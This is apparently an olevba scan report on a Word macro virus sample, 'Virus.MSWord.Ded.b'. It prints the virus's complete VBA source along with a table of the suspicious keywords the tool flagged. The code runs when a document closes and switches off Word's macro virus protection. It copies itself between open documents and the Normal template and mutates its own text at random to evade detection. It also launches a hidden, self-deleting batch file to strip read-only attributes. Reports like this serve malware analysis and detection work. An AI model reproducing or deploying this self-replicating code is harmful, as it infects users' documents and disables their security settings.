olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.b-9c40f4abd91436c37e0a5b83ec355be441f7be45
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.b-9c40f4abd91436c37e0a5b83ec355be441f7be45 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 _
   Private Sub Document_Close()

          On Error GoTo skam
'5,350452
    Options.VirusProtection = unimplemented
'71,27305
 _
 SWL

          ABS99
'62,7642
skam:
'83,48172
        End _
Sub

 _
   Private Sub SWL()

 _
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

  For i _
= 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
 d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

               If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

        While Mid(d, Len(d) _
- 1, 2) = " _"

            i = i + 1
'27,29424
 _
   d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
       Wend

 _
d = e(d)

 _
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
End If

   Next i
'99,37313
 _
ActiveDocument.SaveAs AddToRecentFiles:=False

 _
 End If

         End _
Sub

         Private _
Sub ABS99()

 _
      If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 _
   f (NormalTemplate.FullName)

 _
   For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
       d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

     If Len(d) > 0 _
And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
   While Mid(d, Len(d) - 1, 2) = " _"

 _
     i = i + 1

 _
       d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
    Wend

      d _
= e(d)

 _
  NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
End If

 _
    Next i

 _
  NormalTemplate.Save

 _
              End If

 _
  End Sub

 _
             Private Function e(aString) As String

             For i = _
1 To Len(aString) - 1

   While Mid(aString, i, 2) = " "
'44,69932
 _
      aString = Left(aString, i) & Right(aString, Len(aString) - i - 1)

 _
           Wend

    If Mid(aString, i, 1) = "." Then
'57,48649
    If Not Mid(aString, i _
- 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

  If _
Not Mid(aString, i + 1, 1) = Chr$(34) Then

   e _
= Left(aString, i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
  For J = 1 To Int(15 * Rnd)

 _
e = " " & e

 _
      Next J

 _
    Exit Function

 _
    End If

 _
 End If

 _
  Else

 _
   If Mid(aString, i, 1) = " " And Int(3 * Rnd) = 1 And i > 1 Then

            If Not Mid(aString, i + _
1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then

 _
             e = Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
     For J = 1 To Int(15 * Rnd)

           e _
= " " & e

                 Next J
'29,4659
 _
          Exit Function

 _
   End If

 _
     End If

 _
        End If

 _
        Next i

 _
          e = aString & Chr$(13) & "'" & (100 * Rnd)

 _
       Count = Int(15 * Rnd)

For _
J = 1 To Count

         e _
= " " & e

 _
      Next J

 _
End Function

 _
       Private Sub f(fName)

 _
 If GetAttr(fName) And vbReadOnly Then

               Open Dir(fName) _
& ".bat" For Append As #1

        Print #1, "Attrib " & "-r " & _
Chr$(34) & fName & Chr$(34)

 _
          Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

            Close #1
'97,3131
      shellResult _
= Shell(Dir(fName) & ".bat", vbHide)

 _
          End If

 _
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

